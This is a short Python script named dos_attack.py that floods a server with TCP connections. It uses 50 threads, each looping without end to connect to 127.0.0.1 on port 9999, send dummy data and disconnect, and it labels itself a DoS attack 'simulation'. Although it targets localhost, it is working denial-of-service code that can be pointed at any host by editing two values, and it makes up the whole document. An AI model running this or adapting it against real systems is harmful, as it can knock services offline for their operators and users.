# dos_attack.py
import socket
import threading

target_ip = "127.0.0.1"
target_port = 9999

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(b"Fake request data")
            s.close()
        except:
            pass

# Launching multiple threads to overwhelm the server
for i in range(50):  # Number of threads
    thread = threading.Thread(target=attack)
    thread.start()

print("DoS Attack simulation started...")